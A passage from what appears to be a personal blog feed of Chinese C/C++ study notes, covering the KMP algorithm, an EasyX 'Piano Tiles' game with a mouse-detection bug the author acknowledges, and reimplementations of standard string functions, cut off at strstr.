        <content type="html"><![CDATA[<h1 id="KMP-——-一种字符串匹配算法-学习自董晓算法"><a href="#KMP-——-一种字符串匹配算法-学习自董晓算法" class="headerlink" title="KMP —— 一种字符串匹配算法(学习自董晓算法)"></a>KMP —— 一种字符串匹配算法(学习自董晓算法)</h1><p>给定一个模式串P和一个主串S，求模式串P在主串S中出现的位置。（字符串下标均从1开始）</p><ol><li>去<em>最长的</em>想等前后缀，可以保证不漏解</li><li>通过模式串前后缀的自我匹配长度，计算<em>next函数</em>（降低事件复杂度的关键），给j指针打一张表，失配时跳到next[j]的位置继续匹配。</li></ol><p><em>next函数</em><br>next[i]表示模式串P[1,i]中相等前后缀的最长长度</p><p><img src="https://s2.loli.net/2023/04/09/GrWayKlLNJei2bz.png" alt="image.png"></p><h2 id="next数组代码"><a href="#next数组代码" class="headerlink" title="next数组代码"></a>next数组代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ne[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>,j = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line"><span class="keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="number">1</span>])</span><br><span class="line">j = ne[j];</span><br><span class="line"><span class="keyword">if</span> (p[i] == p[j + <span class="number">1</span>])</span><br><span class="line">j++;</span><br><span class="line">ne[i] = j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>双指针</em>： i扫描模式串, j扫描前缀。<br>初始化，ne[1]&#x3D;0,i&#x3D;2,j&#x3D;0.(固定的)<br>每轮for循环，i向右走一步。</p><ol><li>若p[i]!&#x3D;p[j+1],让j回跳到能匹配的位置，如果找不到能匹配的位置，j跳回0.</li><li>若p[i]&#x3D;&#x3D;p[j+1],让j+1，指向匹配前缀的末尾。</li><li>next[i]&#x3D;j.</li><li>j指针所走的总步数就决定乐总的执行次数，每轮for，j至多+1，那么j一共向右至多走n步，往左挑的部署加起来不超过n步，否则j变为负数，故j的总步数不会超过2n。例 a–ab.所以时间复杂度O(n)</li></ol><p><img src="https://s2.loli.net/2023/04/09/fmOwFJPICvQtaZh.png" alt="image.png"></p><h2 id="模式串与主串匹配代码"><a href="#模式串与主串匹配代码" class="headerlink" title="模式串与主串匹配代码"></a>模式串与主串匹配代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; S[i] != P[j+<span class="number">1</span>]) </span><br><span class="line">        j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(S[i] == P[j+<span class="number">1</span>]) </span><br><span class="line">        j ++;</span><br><span class="line">        <span class="keyword">if</span>(j == n) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i-n+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>双指针: i扫描主串，j扫描模式串。<br>初始化，i&#x3D;1，j&#x3D;0.<br>每轮for，i向右走一步。</p><ol><li>若s[i]!&#x3D;p[j+1],让j回跳到能匹配的位置，如果找不到能匹配的位置，j回跳到0.</li><li>若s[i]&#x3D;&#x3D;p[j+1],让j向右走一步。</li><li>若匹配成功，输出匹配位置。</li><li>时间复杂度同样是O(n)</li></ol><p><img src="https://s2.loli.net/2023/04/09/Lfxs64gRqjUoJdX.png" alt="image.png"></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> m, n;</span><br><span class="line"><span class="type">char</span> S[N], P[N];</span><br><span class="line"><span class="type">int</span> ne[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; S+<span class="number">1</span> &gt;&gt; P+<span class="number">1</span>;</span><br><span class="line">    m = <span class="built_in">strlen</span>(S+<span class="number">1</span>), n = <span class="built_in">strlen</span>(P+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 计算next函数</span></span><br><span class="line">    <span class="built_in">puts</span>(S);</span><br><span class="line">    <span class="built_in">puts</span>(P); </span><br><span class="line">    <span class="comment">//printf(&quot;%d %d&quot;,m ,n);</span></span><br><span class="line">    ne[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= n; i ++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; P[i] != P[j+<span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(P[i] == P[j+<span class="number">1</span>]) j ++; </span><br><span class="line">        ne[i] = j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// KMP匹配</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i ++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; S[i] != P[j+<span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(S[i] == P[j+<span class="number">1</span>]) j ++;</span><br><span class="line">        <span class="keyword">if</span>(j == n) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i-n+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, ne[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>别踩白块儿</title>
      <link href="/2023/04/05/%E5%88%AB%E8%B8%A9%E7%99%BD%E5%9D%97%E5%84%BF/"/>
      <url>/2023/04/05/%E5%88%AB%E8%B8%A9%E7%99%BD%E5%9D%97%E5%84%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="鼠标判断不正常-待填的坑"><a href="#鼠标判断不正常-待填的坑" class="headerlink" title="鼠标判断不正常(待填的坑)"></a>鼠标判断不正常(待填的坑)</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;easyx.h&gt;</span>  <span class="comment">//图形库，绘制图形，输出文字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 别踩白块：c+easyx</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERVAL 100 <span class="comment">//标题高度</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GRID_W 100 <span class="comment">//块的宽度</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GRID_H 150 <span class="comment">//块的高度</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义数组，存储黑块</span></span><br><span class="line"><span class="type">int</span> flags[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//统计成功点了多少个黑块</span></span><br><span class="line"><span class="type">int</span> gCount = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//设置随机数种子</span></span><br><span class="line"><span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"><span class="comment">//随机生成黑块</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flags[i] = <span class="built_in">rand</span>() % <span class="number">4</span>;<span class="comment">//0,1,2,3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* title = <span class="string">&quot;别踩白块儿&quot;</span>;</span><br><span class="line"><span class="built_in">setlinestyle</span>(PS_SOLID, <span class="number">2</span>);</span><br><span class="line"><span class="comment">//线条的颜色，默认是白色</span></span><br><span class="line"><span class="built_in">setlinecolor</span>(BLACK);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//画横线</span></span><br><span class="line"><span class="built_in">line</span>(<span class="number">0</span>, i * <span class="number">150</span> + INTERVAL, <span class="number">400</span>, i * <span class="number">150</span> + INTERVAL);</span><br><span class="line"><span class="comment">//画竖线</span></span><br><span class="line"><span class="built_in">line</span>(<span class="number">100</span> * i, INTERVAL, i * <span class="number">100</span>, <span class="number">700</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置文字颜色,样式</span></span><br><span class="line"><span class="built_in">settextcolor</span>(BLACK);</span><br><span class="line"><span class="built_in">settextstyle</span>(<span class="number">38</span>, <span class="number">0</span>, <span class="string">&quot;Arial&quot;</span>);</span><br><span class="line"><span class="comment">//输出标题(居中)</span></span><br><span class="line"><span class="type">int</span> spaceW = (<span class="built_in">getwidth</span>() - <span class="built_in">textwidth</span>(title)) / <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> spaceH = (INTERVAL - <span class="built_in">textheight</span>(title)) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">outtextxy</span>(spaceW, spaceH, title);</span><br><span class="line"></span><br><span class="line"><span class="comment">//绘制黑块</span></span><br><span class="line"><span class="built_in">setfillcolor</span>(BLACK);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//求出黑块的左上角坐标;</span></span><br><span class="line"><span class="type">int</span> x = flags[i] * GRID_W;</span><br><span class="line"><span class="type">int</span> y = i * GRID_H + INTERVAL;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">setfillcolor</span>(<span class="built_in">RGB</span>(<span class="number">156</span>, <span class="number">156</span>, <span class="number">156</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//绘制一个矩形</span></span><br><span class="line"><span class="built_in">fillrectangle</span>(x, y, x + GRID_W, y + GRID_H);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出分数</span></span><br><span class="line"><span class="built_in">settextstyle</span>(<span class="number">26</span>, <span class="number">0</span>, <span class="string">&quot;微软雅黑&quot;</span>);</span><br><span class="line"><span class="type">char</span> score[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">sprintf_s</span>(score,<span class="string">&quot;Score:%d&quot;</span>, gCount);</span><br><span class="line"></span><br><span class="line"><span class="built_in">outtextxy</span>(<span class="number">20</span>, <span class="number">40</span>, score);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理鼠标点击</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">mousePressMsg</span><span class="params">(ExMessage* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获取下标为2的黑块的坐标</span></span><br><span class="line"><span class="type">int</span> x = flags[<span class="number">2</span>]*GRID_W;</span><br><span class="line"><span class="type">int</span> y = <span class="number">2</span> * GRID_H + INTERVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是不是点击的下标为2的黑块</span></span><br><span class="line"><span class="keyword">if</span> (msg-&gt;x &gt; x &amp;&amp; x &lt; x + GRID_W  &amp;&amp; msg-&gt;y &gt; y &amp;&amp; msg-&gt;y &lt; y + GRID_H)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//黑块从上往下移动</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">3</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">flags[i] = flags[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">flags[<span class="number">0</span>] = <span class="built_in">rand</span>() % <span class="number">4</span>;<span class="comment">//随机生成</span></span><br><span class="line">gCount++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;你点击了正确的黑块\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;%s&quot;, __FUNCTION__); /* 输出是什么函数 */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gameOverHit</span><span class="params">(<span class="type">int</span> w, <span class="type">int</span> h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">setlinecolor</span>(GREEN);</span><br><span class="line"><span class="built_in">setfillcolor</span>(<span class="built_in">RGB</span>(<span class="number">93</span>, <span class="number">107</span>, <span class="number">153</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//画一个矩形</span></span><br><span class="line"><span class="type">int</span> spaceH = (<span class="built_in">getwidth</span>() - w) / <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> spaceV = (<span class="built_in">getwidth</span>() - h) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">fillrectangle</span>(spaceH, spaceV, spaceH + w, spaceV + h);</span><br><span class="line"><span class="type">int</span> mid_w = (spaceH + w) / <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> mid_h = (<span class="number">2</span>*spaceV+h) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">outtextxy</span>(mid_w, mid_h, <span class="string">&quot;lyx is sb&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1.黑窗口，来个图形窗口</span></span><br><span class="line"><span class="built_in">initgraph</span>(<span class="number">400</span>, <span class="number">700</span>, EX_SHOWCONSOLE);</span><br><span class="line"><span class="comment">//设置背景颜色</span></span><br><span class="line"><span class="built_in">setbkcolor</span>(WHITE);</span><br><span class="line"><span class="built_in">cleardevice</span>();</span><br><span class="line"><span class="built_in">setbkmode</span>(TRANSPARENT);</span><br><span class="line"><span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">draw</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//游戏主循环</span></span><br><span class="line"><span class="type">bool</span> isDone = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">while</span> (!isDone)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//消息(鼠标)处理</span></span><br><span class="line">ExMessage msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">peekmessage</span>(&amp;msg))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//按ESC退出游戏</span></span><br><span class="line"><span class="keyword">switch</span> (msg.message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line"><span class="keyword">if</span> (msg.vkcode == VK_ESCAPE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;quit\n&quot;</span>);</span><br><span class="line">isDone = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">mousePressMsg</span>(&amp;msg))</span><br><span class="line">&#123;</span><br><span class="line">isDone = <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//绘制</span></span><br><span class="line"><span class="built_in">BeginBatchDraw</span>();<span class="comment">//清除缓存</span></span><br><span class="line"><span class="built_in">cleardevice</span>();<span class="comment">//清屏</span></span><br><span class="line"><span class="built_in">draw</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">EndBatchDraw</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">gameOverHit</span>(<span class="number">200</span>,<span class="number">150</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//设置线条的样式</span></span><br><span class="line"><span class="comment">setlinestyle(PS_SOLID, 3);</span></span><br><span class="line"><span class="comment">//设置线条yanse</span></span><br><span class="line"><span class="comment">setlinecolor(RED);</span></span><br><span class="line"><span class="comment">//绘制线条</span></span><br><span class="line"><span class="comment">line(0, 0, 640, 480);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//设置填充颜色</span></span><br><span class="line"><span class="comment">setfillcolor(GREEN);</span></span><br><span class="line"><span class="comment">//绘制矩形</span></span><br><span class="line"><span class="comment">rectangle(50, 50, 50 + 250, 50 + 50);</span></span><br><span class="line"><span class="comment">fillrectangle(50, 160, 50 + 250, 60 + 50);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符串函数模拟实现</title>
      <link href="/2023/04/02/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/"/>
      <url>/2023/04/02/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="size-t-strlen-const-char-str-求字符串长度"><a href="#size-t-strlen-const-char-str-求字符串长度" class="headerlink" title="size_t strlen(const char* str)求字符串长度"></a>size_t strlen(const char* str)求字符串长度</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="comment">//1.计数器版本</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">assert(str != <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">while</span> (*str != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">count++;</span><br><span class="line">str++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr[] = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="type">int</span> len = my_strlen(arr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, len);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>字符串已经以’\0’作为结束标志，strlen函数返回的是在字符串中’\0’前面出现的字符个数（不包含’\0’）。–{‘a’,’b’}不可以</li><li>参数指向的字符串必须要以’\0’结束</li><li>函数的返回值是size_t，是无符号的</li></ol><h1 id="char-strcpy-char-destination-const-char-source-拷贝字符串"><a href="#char-strcpy-char-destination-const-char-source-拷贝字符串" class="headerlink" title="char* strcpy(char* destination, const char* source)拷贝字符串"></a>char* strcpy(char* destination, const char* source)拷贝字符串</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="comment">//str1 -- destination</span></span><br><span class="line"><span class="comment">//str2 -- source</span></span><br><span class="line"><span class="type">char</span>* <span class="title function_">my_strcpy</span><span class="params">(<span class="type">char</span>* str1,<span class="type">const</span> <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (*str2 != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">*(str1 + i) = *str2;</span><br><span class="line">str2++;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">*(str1 + i) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> str1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span>* p = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">my_strcpy(arr, p);</span><br><span class="line"><span class="built_in">puts</span>(arr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>源字符串必须要以’\0’结束</li><li>会将源字符串中的’\0’拷贝到目标空间</li><li>目标空间必须足够大，以确保能存放源字符串</li><li>目标空间必须可变（不可以是char* str &#x3D; “#####”）</li></ol><h1 id="char-strcat-char-destination-const-char-source-字符串追加"><a href="#char-strcat-char-destination-const-char-source-字符串追加" class="headerlink" title="char* strcat(char* destination, const char* source)字符串追加"></a>char* strcat(char* destination, const char* source)字符串追加</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">my_strcat</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span>* src)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(dest &amp;&amp; src);</span><br><span class="line"><span class="comment">//1.找目标字符串中得\0</span></span><br><span class="line"><span class="keyword">while</span> (*dest) &#123;</span><br><span class="line">dest++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.追加源字符串，连\0一起</span></span><br><span class="line"><span class="keyword">while</span> (*dest++ = *src++) &#123;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr[<span class="number">20</span>] = <span class="string">&quot;hello &quot;</span>;<span class="comment">//world!</span></span><br><span class="line"><span class="type">char</span> arr2[] = <span class="string">&quot;world!&quot;</span>;<span class="comment">//传数组名也可以</span></span><br><span class="line"><span class="comment">//strcat(arr, arr2);</span></span><br><span class="line">my_strcat(arr,<span class="string">&quot;world!&quot;</span>);<span class="comment">//字符串追加（连接）</span></span><br><span class="line"><span class="built_in">puts</span>(arr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 如果需要返回类型为char*</span></span><br><span class="line"><span class="comment">char* my_strcat(char* dest, const char* src)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">char* ret = dest;</span></span><br><span class="line"><span class="comment">assert(dest &amp;&amp; src);</span></span><br><span class="line"><span class="comment">//1.找目标字符串中得\0</span></span><br><span class="line"><span class="comment">while (*dest) &#123;</span></span><br><span class="line"><span class="comment">dest++;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">//2.追加源字符串，连\0一起</span></span><br><span class="line"><span class="comment">while (*dest++ = *src++) &#123;</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">return ret;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ol><li>源字符串必须以’\0’结束</li><li>目标空间必须足够大。</li><li>目标空间必须可以修改</li><li>但不能自己给自己追加</li></ol><h1 id="int-strcmp-const-char-str1-const-char-str2"><a href="#int-strcmp-const-char-str1-const-char-str2" class="headerlink" title="int strcmp(const char* str1, const char* str2)"></a>int strcmp(const char* str1, const char* str2)</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str1, <span class="type">const</span> <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(str1);</span><br><span class="line">assert(str2);</span><br><span class="line"><span class="keyword">while</span> (*str1 == *str2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (*str1 == <span class="string">&#x27;\0&#x27;</span> || *str2 == <span class="string">&#x27;\0&#x27;</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">str1++;</span><br><span class="line">str2++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>  *str1 - *str2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* p = <span class="string">&quot;obcb&quot;</span>;</span><br><span class="line"><span class="type">char</span>* q = <span class="string">&quot;obca&quot;</span>;</span><br><span class="line"><span class="type">int</span> ret = my_strcmp(p, q);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ret);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>第一个字符串大于第二个字符串，则返回大于0得数字</li><li>等于，则返回0</li><li>小于，则返回小于0的数字</li></ol><p><em>strcpy strcat strcmp 长度不受限制的字符串函数</em></p><p><em>strncpy strncay strncmp 长度受限制的字符串，可以控制参与变化的字符串中的字符个数</em></p><h1 id="char-strstr-char-str1-const-char-str2"><a href="#char-strstr-char-str1-const-char-str2" class="headerlink" title="char * strstr (       char * str1, const char * str2 );"></a>char * strstr (       char * str1, const char * str2 );</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 